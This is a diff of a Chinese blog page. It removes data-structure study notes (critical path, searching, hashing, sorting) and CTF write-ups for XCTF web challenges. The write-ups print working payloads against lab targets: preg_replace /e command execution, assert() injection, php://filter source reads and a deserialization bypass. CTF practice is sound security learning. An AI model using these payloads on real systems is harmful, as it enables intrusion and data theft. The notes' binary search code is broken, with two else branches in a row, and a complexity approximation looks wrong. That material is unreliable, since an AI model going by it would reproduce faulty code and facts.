-<h3 id="5、用弧表示每个步骤环节的活动"><a href="#5、用弧表示每个步骤环节的活动" class="headerlink" title="5、用弧表示每个步骤环节的活动"></a>5、用弧表示每个步骤环节的活动</h3><p>用顶点来表示步骤环节开始或者结束时刻的状态，而弧上的权值则表示该活动进行所需要的时间，由此构成了边表示活动的有向图</p>
-<h3 id="6、Vi的最早呈现时间Ve-i"><a href="#6、Vi的最早呈现时间Ve-i" class="headerlink" title="6、Vi的最早呈现时间Ve(i)"></a>6、Vi的最早呈现时间Ve(i)</h3><h4 id="（1）、始点的Ve-i-值为0，即Ve-Vbegin-0"><a href="#（1）、始点的Ve-i-值为0，即Ve-Vbegin-0" class="headerlink" title="（1）、始点的Ve(i)值为0，即Ve(Vbegin)=0"></a>（1）、始点的Ve(i)值为0，即Ve(Vbegin)=0</h4><h4 id="（2）、如果Vi的入度为1，则Ve-i-Ve-left-dut-left-i-，上一个值加权"><a href="#（2）、如果Vi的入度为1，则Ve-i-Ve-left-dut-left-i-，上一个值加权" class="headerlink" title="（2）、如果Vi的入度为1，则Ve(i)=Ve(left)+dut(left,i)，上一个值加权"></a>（2）、如果Vi的入度为1，则Ve(i)=Ve(left)+dut(left,i)，上一个值加权</h4><h4 id="（3）、如果Vi的入度大于1，则Ve-i-max-Ve-left-k-dut-left-i"><a href="#（3）、如果Vi的入度大于1，则Ve-i-max-Ve-left-k-dut-left-i" class="headerlink" title="（3）、如果Vi的入度大于1，则Ve(i)=max{Ve(left(k)+dut(left,i)}"></a>（3）、如果Vi的入度大于1，则Ve(i)=max{Ve(left(k)+dut(left,i)}</h4><h3 id="7、Vi的最晚呈现时间Vl-i"><a href="#7、Vi的最晚呈现时间Vl-i" class="headerlink" title="7、Vi的最晚呈现时间Vl(i)"></a>7、Vi的最晚呈现时间Vl(i)</h3><h4 id="（1）、Vl-vend-Ve-Vend-T"><a href="#（1）、Vl-vend-Ve-Vend-T" class="headerlink" title="（1）、Vl(vend)=Ve(Vend)=T"></a>（1）、Vl(vend)=Ve(Vend)=T</h4><h4 id="（2）、如果Vi的出度为1，则Vl-i-Vl-right-dut-i-right"><a href="#（2）、如果Vi的出度为1，则Vl-i-Vl-right-dut-i-right" class="headerlink" title="（2）、如果Vi的出度为1，则Vl(i)=Vl(right)-dut(i,right)"></a>（2）、如果Vi的出度为1，则Vl(i)=Vl(right)-dut(i,right)</h4><h4 id="（3）、如果Vi的入度大于1，则Ve-i-min-Vl-right-dut-i-right"><a href="#（3）、如果Vi的入度大于1，则Ve-i-min-Vl-right-dut-i-right" class="headerlink" title="（3）、如果Vi的入度大于1，则Ve(i)=min{Vl(right)-dut(i,right)}"></a>（3）、如果Vi的入度大于1，则Ve(i)=min{Vl(right)-dut(i,right)}</h4><h3 id="8、当Vi-Vl时，为关键路径"><a href="#8、当Vi-Vl时，为关键路径" class="headerlink" title="8、当Vi=Vl时，为关键路径"></a>8、当Vi=Vl时，为关键路径</h3><h2 id="六、最短路径"><a href="#六、最短路径" class="headerlink" title="六、最短路径"></a>六、最短路径</h2><h3 id="1、最短路径"><a href="#1、最短路径" class="headerlink" title="1、最短路径"></a>1、最短路径</h3><p>是指两个顶点之间所经过的边/弧上权值之后最小的路径</p>
-<h3 id="2、Dijkstra算法"><a href="#2、Dijkstra算法" class="headerlink" title="2、Dijkstra算法"></a>2、Dijkstra算法</h3><p>时间复杂度为O(n的平方)</p>
-<h1 id="第七章-查找"><a href="#第七章-查找" class="headerlink" title="第七章 查找"></a>第七章 查找</h1><h3 id="1、顺序查找的查找成功的平均查找长度"><a href="#1、顺序查找的查找成功的平均查找长度" class="headerlink" title="1、顺序查找的查找成功的平均查找长度"></a>1、顺序查找的查找成功的平均查找长度</h3><p>为<code>(n+1)/2</code>，时间复杂度为<code>O(n)</code>。</p>
-<h3 id="2、折半查找"><a href="#2、折半查找" class="headerlink" title="2、折半查找"></a>2、折半查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int Binary_Search(int data[],int n,int k)</span><br><span class="line">&#123;</span><br><span class="line">	int low,high,mid;</span><br><span class="line">	low&#x3D;0;high&#x3D;n-1;</span><br><span class="line">	while(low&lt;&#x3D;high)</span><br><span class="line">	&#123;</span><br><span class="line">		mid&#x3D;(low+high)&#x2F;2;</span><br><span class="line">		if(k&lt;data[mid])</span><br><span class="line">			high&#x3D;mid-1;</span><br><span class="line">		else </span><br><span class="line">			low&#x3D;mid+1;</span><br><span class="line">		else </span><br><span class="line">			return mid;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>折半查找的平均查找长度为<code>((n+1)/n)lb(n+1)-1</code></p>
-<p>当n&gt;50时，可有近似结果<code>ln(n+1)-1</code></p>
-<p>折半查找主要应用在有序表中而顺序查找主要应用在无序表中</p>
-<p>时间复杂度为O(lbn)</p>
-<h3 id="3、索引表的查找"><a href="#3、索引表的查找" class="headerlink" title="3、索引表的查找"></a>3、索引表的查找</h3><p>时间复杂度为O(n的二分之一次方)</p>
-<h3 id="4、稠密索引"><a href="#4、稠密索引" class="headerlink" title="4、稠密索引"></a>4、稠密索引</h3><p>索引项一定是按照关键字有序的排列</p>
-<h3 id="5、分块索引"><a href="#5、分块索引" class="headerlink" title="5、分块索引"></a>5、分块索引</h3><h4 id="（1）、块内无序"><a href="#（1）、块内无序" class="headerlink" title="（1）、块内无序"></a>（1）、块内无序</h4><h4 id="（2）、块间有序"><a href="#（2）、块间有序" class="headerlink" title="（2）、块间有序"></a>（2）、块间有序</h4><h3 id="6、二叉排序树"><a href="#6、二叉排序树" class="headerlink" title="6、二叉排序树"></a>6、二叉排序树</h3><h4 id="（1）、若它的左子树不空，则左子树上所有结点的值均小于它的根节点的值"><a href="#（1）、若它的左子树不空，则左子树上所有结点的值均小于它的根节点的值" class="headerlink" title="（1）、若它的左子树不空，则左子树上所有结点的值均小于它的根节点的值"></a>（1）、若它的左子树不空，则左子树上所有结点的值均小于它的根节点的值</h4><h4 id="（2）、若它的右子树不空，则右子树上所有结点的值均大于他的根结点的值"><a href="#（2）、若它的右子树不空，则右子树上所有结点的值均大于他的根结点的值" class="headerlink" title="（2）、若它的右子树不空，则右子树上所有结点的值均大于他的根结点的值"></a>（2）、若它的右子树不空，则右子树上所有结点的值均大于他的根结点的值</h4><h4 id="（3）、它的左、右子树也分别为二叉排序树"><a href="#（3）、它的左、右子树也分别为二叉排序树" class="headerlink" title="（3）、它的左、右子树也分别为二叉排序树"></a>（3）、它的左、右子树也分别为二叉排序树</h4><p>构造一棵二叉排序树的目的，其实并不是为了排序，而是为了提高茶查找、插入和删除关键字的速度。</p>
-<h3 id="7、平衡二叉树"><a href="#7、平衡二叉树" class="headerlink" title="7、平衡二叉树"></a>7、平衡二叉树</h3><p>是一种二叉排序树，其中每个结点的左子树和右子树的高度差的绝对值不超过1.</p>
-<h3 id="8、哈希查找"><a href="#8、哈希查找" class="headerlink" title="8、哈希查找"></a>8、哈希查找</h3><p>哈希查找又称为散列表查找</p>
-<p>哈希函数的构造方法</p>
-<h4 id="（1）、计算简单"><a href="#（1）、计算简单" class="headerlink" title="（1）、计算简单"></a>（1）、计算简单</h4><p>所以焊锡函数的时间复杂度不应该大于其他查找技术</p>
-<h4 id="（2）、散列地址分布均匀"><a href="#（2）、散列地址分布均匀" class="headerlink" title="（2）、散列地址分布均匀"></a>（2）、散列地址分布均匀</h4><h3 id="1、直接定址法"><a href="#1、直接定址法" class="headerlink" title="1、直接定址法"></a>1、直接定址法</h3><p><code>f(key)=a * key + b</code>，要求查找表取值范围很小而且实际存储的数据存储基本上是按关键字连续的</p>
-<h3 id="2、数字分析法"><a href="#2、数字分析法" class="headerlink" title="2、数字分析法"></a>2、数字分析法</h3><p>如关键字为数字型，位数较长，其中若干位分布比较均匀，而其他位数变化较少</p>
-<h3 id="3、折叠法"><a href="#3、折叠法" class="headerlink" title="3、折叠法"></a>3、折叠法</h3><p>用于事先不知道关键字分布，且位数较多的情况（学校10年来找80个学生）</p>
-<h3 id="4、除留取余法"><a href="#4、除留取余法" class="headerlink" title="4、除留取余法"></a>4、除留取余法</h3><p><code>Hash(key)=key mod p (p&lt;=m)</code> p选择为小于或等于len的一个质数</p>
-<h3 id="9、处理哈希冲突的方法"><a href="#9、处理哈希冲突的方法" class="headerlink" title="9、处理哈希冲突的方法"></a>9、处理哈希冲突的方法</h3><p>####（1）、开放定址法<br><code>Hi=(Hash(key)+di) mod m</code> m:哈希表长</p>
-<h4 id="（2）、再哈希法"><a href="#（2）、再哈希法" class="headerlink" title="（2）、再哈希法"></a>（2）、再哈希法</h4><p>事先准备另外一套备用的哈希函数</p>
-<h4 id="（3）、链地址法"><a href="#（3）、链地址法" class="headerlink" title="（3）、链地址法"></a>（3）、链地址法</h4><p>冲突的元素用单链表进行链接</p>
-<h4 id="（4）、公共溢出区法"><a href="#（4）、公共溢出区法" class="headerlink" title="（4）、公共溢出区法"></a>（4）、公共溢出区法</h4><p>冲突的另开一处区域</p>
-<h3 id="10、哈希查找是本章介绍的所有查找方法中效率最高的，可到O-c"><a href="#10、哈希查找是本章介绍的所有查找方法中效率最高的，可到O-c" class="headerlink" title="10、哈希查找是本章介绍的所有查找方法中效率最高的，可到O(c)"></a>10、哈希查找是本章介绍的所有查找方法中效率最高的，可到O(c)</h3><h1 id="第八章-排序"><a href="#第八章-排序" class="headerlink" title="第八章 排序"></a>第八章 排序</h1><h3 id="1、直接插入排序"><a href="#1、直接插入排序" class="headerlink" title="1、直接插入排序"></a>1、直接插入排序</h3><h3 id="2、希尔排序"><a href="#2、希尔排序" class="headerlink" title="2、希尔排序"></a>2、希尔排序</h3><p>以5，3，1间隔比较</p>
-<h3 id="3、冒泡排序"><a href="#3、冒泡排序" class="headerlink" title="3、冒泡排序"></a>3、冒泡排序</h3><h3 id="4、快速排序"><a href="#4、快速排序" class="headerlink" title="4、快速排序"></a>4、快速排序</h3><p>先比后面，再比前面，平均时间复杂度O(nlbn)，最坏为O(n的平方)</p>
-<h3 id="5、简单排序法"><a href="#5、简单排序法" class="headerlink" title="5、简单排序法"></a>5、简单排序法</h3><p>依次选取最小的、次小的、、、、与相对应的元素所在的位置互换</p>
-<h3 id="6、堆排序"><a href="#6、堆排序" class="headerlink" title="6、堆排序"></a>6、堆排序</h3><p>是一棵完全二叉树，大堆顶、小堆顶</p>
-<h3 id="7、归并排序"><a href="#7、归并排序" class="headerlink" title="7、归并排序"></a>7、归并排序</h3><p>分为几个部分</p>
-<h3 id="8、基数排序"><a href="#8、基数排序" class="headerlink" title="8、基数排序"></a>8、基数排序</h3><p>先按个位排、再按10位拍、再按百位排。</p>
-
+      <p>点击稳过数据结构</p>
+      
+      <a class="article-more-link" href="/2019/12/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80%E6%8A%8A%E6%A2%AD/">阅读更多...</a>
+      
       
       <!-- 打赏 -->
       
@@ -276,72 +163,10 @@
       
 
       
-      <a id="more"></a>
-
-<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>按照他的要求输入了loli.club(萝莉俱乐部？？)，什么都没有发生。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/nUoE8GAu2go2QHJpvwmmoSMa.qyDh5LY.ybHNPYOMPA!/b/dMUAAAAAAAAA&bo=SQVgAQAAAAADBw8!&rf=viewer_4" alt=""><br>因为题目名字为Cat，所以输入了Cat试试<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/h*a0bRwoh7JmCjR2pT3lCJu0lAtBBxvPNfCfAp10H*k!/b/dL8AAAAAAAAA&bo=hwSsAQAAAAADBww!&rf=viewer_4" alt=""><br>居然出现了报错，从报错来看出现了ping，联想到CTF中常出现的ping的命令执行，于是测试了一下他过滤了哪些截断符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  ;  |  - (  )  &#96;  ||  &amp;&amp;  &amp;  &#123;  &#125;  %0a(这个可以代替空格)</span><br></pre></td></tr></table></figure>
-<p>发现他把这些都进行的过滤，但是发现在输入<code>;</code>时，url中的分号被url编码了，通过在url中输入%80出现报错（因为url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。）<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/BbBlhC.Mr9HuWDZD.cNjgbITHBgC89EtgOnTh1Z4LXE!/b/dE0BAAAAAAAA&bo=SwV9AgAAAAADBxM!&rf=viewer_4" alt=""><br>通过报错信息我们发现了<code>/opt/api/dnsapi/views.py</code>而根据<code>php cur</code>，我们可以通过<code>@</code>进行文件传送，而这里因为超出了界限，所以会类似于%80将报错信息输出到网页中。构造url<code>http://111.198.29.45:57650/index.php?url=@/opt/api/dnsapi/views.py</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Z5ghxMd2DlyaqqEyjGk8dfdZ1D1lRMMuvrnUUheY*is!/b/dAgBAAAAAAAA&bo=VgVaAgAAAAADJwk!&rf=viewer_4" alt=""><br>发现database这个敏感词，访问目录得到flag<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Kv04JMxAnY0gR5HyO6ME2Sj.1wNTv4bvgDtpTbi.4hY!/b/dL4AAAAAAAAA&bo=VgUcAgAAAAADJ08!&rf=viewer_4" alt=""></p>
-<h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>访问题目什么提示都没有，查看源码，burp抓包也没有什么有用信息，通过目录扫描，发现存在index.phps，访问后发现是一段PHP代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">not allowed!</span><br><span class="line"></span><br><span class="line">&quot;); exit(); &#125; $_GET[id] &#x3D; urldecode($_GET[id]); if($_GET[id] &#x3D;&#x3D; &quot;admin&quot;) &#123; echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;; echo &quot;</span><br><span class="line"></span><br><span class="line">Key: xxxxxxx</span><br><span class="line">&quot;; &#125; ?&gt; Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
-<p>虽然代码不全，但是通过猜测，大概可以知道</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]); if($_GET[id] &#x3D;&#x3D; &quot;admin&quot;) &#123; echo &quot;</span><br></pre></td></tr></table></figure>
-<p>这句话是让我们get一个id通过url解码之后等于admin，于是我们根据<a href="https://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">url编码表</a>把admin转换成<code>%2561dmin</code>（因为浏览器会自动解码一次url编码，所以需要编码两次）<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/cqqG..IypECoeaQ9d9QGx826B1HdL6DMmT3CzpKNvg4!/b/dLgAAAAAAAAA&bo=QQUtAQAAAAADB0o!&rf=viewer_4" alt=""></p>
-<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>点开题目，发现是一个类型于工控的管理系统，看一看左边每一个按键<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/kjALqnLqeSo4z3**7QsN6Atf4o6GCoc6xW6VKBOlBbU!/b/dD4BAAAAAAAA&bo=VgWZAgAAAAADV7o!&rf=viewer_4" alt=""><br>发现除了报表中心，其他都没有用。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/eej5gaRzTCGwZ5tSLbcGnAe1F9cM0N22mDQqQUsEmho!/b/dFMBAAAAAAAA&bo=UQXGAQAAAAADJ5E!&rf=viewer_4" alt=""><br>发现无论怎么选择日期都没有用，观察到url中有一个参数<code>?id=1</code>，在尝试<code>&#39;</code>,<code>&lt;&gt;</code>等特殊字符（测试sql注入和xss）无效后，发现可以存在<code>?id=10000</code>又根据题目所说留了一处痕迹，于是尝试对<code>?id=1</code>进行爆破<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/ZeZLuxPpopvwj9FpLJTrOvMHfyeq6fj28zT14SQ0NOM!/b/dL4AAAAAAAAA&bo=WAO.AgAAAAADB8U!&rf=viewer_4" alt=""><br>根据爆破结果访问<code>?id=2333</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/3lp7oFYWk4a9gzGYM3JzFXbUPyinnDI.Y0f6XFfhzgw!/b/dMMAAAAAAAAA&bo=VgWPAQAAAAADJ98!&rf=viewer_4" alt=""></p>
-<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>访问题目，很明显是一道返序列化题目，而_wakeup这个魔法函数，如果传入的属性数量就不会执行，也就不会输出bad requests<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/QJrkOCAi3jECA7iS4sshtEuuFzUvuHFF5XnsMSvyLKE!/b/dDMBAAAAAAAA&bo=YwQXAQAAAAADB1M!&rf=viewer_4" alt=""><br>于是构造<code>?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>得到flag<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/bGOpPdWmIt6TiV128nyWtdlRmVe3dahNVh4eIzsSmHc!/b/dLgAAAAAAAAA&bo=RgUeAQAAAAADJ14!&rf=viewer_4" alt=""></p>
-<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>打开题目后，明显的一个搜索框，测试之后发现是post传输<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/xrBwMin6Xy1lFLo6PtYaXBiD0idouZywO*9pCKysM78!/b/dL4AAAAAAAAA&bo=VgVaAgAAAAADByk!&rf=viewer_4" alt=""><br>先随手测试一下SQLmap<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/C4UXoLXBpiI0JTMN5Zd.8GNz9l5TIbeqt.mq7qvGUG8!/b/dFQBAAAAAAAA&bo=4QMHAgAAAAADF9U!&rf=viewer_4" alt=""><br>没想到就直接出来了<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/MneYOHrDO59L5rKrO7Myw1qv3rBdHJmYmwbQxG7sDCo!/b/dLsAAAAAAAAA&bo=ywHRAAAAAAADFyk!&rf=viewer_4" alt=""></p>
-<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>访问页面，发现还是那个工控系统<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Q9Ppr.ms9JrcO5Abou39*xSFekdQwtWCbqh9hDCcqRg!/b/dDQBAAAAAAAA&bo=AgRKAgAAAAADB2w!&rf=viewer_4" alt=""><br>发现只有设备维护中心有东西<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/lxIchWSpuZLFysf0SELLML921VYTwe4lcwBUENDt6hY!/b/dIQAAAAAAAAA&bo=VgXdAQAAAAADJ40!&rf=viewer_4" alt=""><br>点击左上角的<code>云平台设备维护中心</code>发现url变成了<code>http://url/index.php?page=index</code>,根据此联想到PHP伪协议<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p>成功读取到源码</p>
-<p>base64 解码后提取出关键代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>一看到preg_replace就感到熟悉</p>
-<p><a href="https://www.runoob.com/php/php-preg_replace.html" target="_blank" rel="noopener">preg_replace函数解释</a></p>
-<p><a href="https://blog.csdn.net/zz_caleb/article/details/88660430" target="_blank" rel="noopener">preg_replace函数/e</a></p>
-<p><code>知识点：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</code></p>
-<p>所以构造<code>?pat=|.*|e&amp;rep=system(&quot;ls&quot;)&amp;sub=</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/BoYsP21FWQWkgm*vK.j8sY66.vwPR38lnlLWhpF8BVk!/b/dFQBAAAAAAAA&bo=ZQSAAgAAAAADF9E!&rf=viewer_4" alt=""><br>因为是在burp中所以空格需要使用+来代替，而url编码下需要使用%26来代替&amp;&amp;<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/VTXVn.CCuL33Mh5jtnFjI7GxaZc8xJBEA4pv8USwv.0!/b/dDUBAAAAAAAA&bo=ZQSAAgAAAAADF9E!&rf=viewer_4" alt=""><br>最后构造<code>/index.php?pat=|.*|e&amp;rep=system(&quot;cd+s3chahahaDir%26%26+cd+flag%26%26ls%26%26cat+flag.php&quot;)&amp;sub=</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/BwsYjrtUSkp0kYCcHW*HFG0QXK4Yx8tXbFmr54UBIc8!/b/dL8AAAAAAAAA&bo=ZQSAAgAAAAADF9E!&rf=viewer_4" alt=""></p>
-<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>进入题目后，点击about，发现给出提示Git，联想到.git泄露<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/MQ90PCW.BmOprjP9Or.4wAHDH17q*SbTcKsoZp0D00Y!/b/dL4AAAAAAAAA&bo=VgXzAQAAAAADB4M!&rf=viewer_4" alt=""><br>访问后，发现确实存在<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/v2Ppxxs9krnuDPCSp7UWuwqOYBubzc1CEZ4kbwAtD9I!/b/dLgAAAAAAAAA&bo=RwQrAgAAAAADJ2g!&rf=viewer_4" alt=""><br>于是使用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a>爬源码(注意，需要使用py2运行)<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/GEdedi644*WfCLx6GOxGog51ou6idqofZzi09qPRh78!/b/dLYAAAAAAAAA&bo=EAKdAAAAAAADF70!&rf=viewer_4" alt=""><br>在index.php中发现关键代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert() 检查一个断言是否为 FALSE</span><br><span class="line">strpos() 查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False，在这里用于过滤..&#x2F;这样的操作</span><br></pre></td></tr></table></figure>
-
-<p>此外<a href="https://www.php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">assert()</a>还进行执行代码</p>
-<p>所以我们闭合file，执行读取<br><code>/?page=1&#39;) or system(&quot;cat templates/flag.php&quot;);//</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Zzj*3rjMS86Nw0XF8IAqgzCypArWmZmNRqsM*PMaURc!/b/dLYAAAAAAAAA&bo=MAQ6AQAAAAADFz0!&rf=viewer_4" alt=""></p>
-<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件后，发现是一段JS代码，又因为是Web题，所以将后缀改为.html，打开。<br>发现有一个输入框<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/2ZfOvlkAoE8R*7606.rngPbwWFI9ifcRXjg8LocOu3M!/b/dL8AAAAAAAAA&bo=9AL0AAAAAAADByA!&rf=viewer_4" alt=""><br>修改源代码最后面的<code>eval()</code>为<code>alert()</code></p>
-<p>再次访问.html得到源码，整理之后如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">var e&#x3D;document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length&#x3D;&#x3D;16)</span><br><span class="line">	if(e.match(&#x2F;^be0f23&#x2F;)!&#x3D;null)</span><br><span class="line">		if(e.match(&#x2F;233ac&#x2F;)!&#x3D;null)</span><br><span class="line">			if(e.match(&#x2F;e98aa$&#x2F;)!&#x3D;null)</span><br><span class="line">				if(e.match(&#x2F;c7be9&#x2F;)!&#x3D;null)</span><br><span class="line">				&#123;</span><br><span class="line">					var t&#x3D;[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">					var n&#x3D;[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">					var r&#x3D;[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">					var i&#x3D;[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">					var s&#x3D;[t,n,r,i];</span><br><span class="line">					for(var o&#x3D;0;o&lt;13;++o)</span><br><span class="line">					&#123;</span><br><span class="line">						document.write(s[o%4][0]);</span><br><span class="line">						s[o%4].splice(0,1)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#39;&lt;input id&#x3D;&quot;c&quot;&gt;&lt;button onclick&#x3D;$()&gt;Ok&lt;&#x2F;button&gt;&#39;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^表示开头必须匹配到</span><br><span class="line">$表示结尾必须匹配到</span><br></pre></td></tr></table></figure>
-
-<p>最后的字符串为<code>be0f233ac7be98aa</code>,在输入框里输入（再把alert改回来），得到flag<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/8zYdtNEr05PuMcZVrnck7UrFZsRuDZphsDn9Slakdnw!/b/dMMAAAAAAAAA&bo=8gM4AQAAAAADF*o!&rf=viewer_4" alt=""></p>
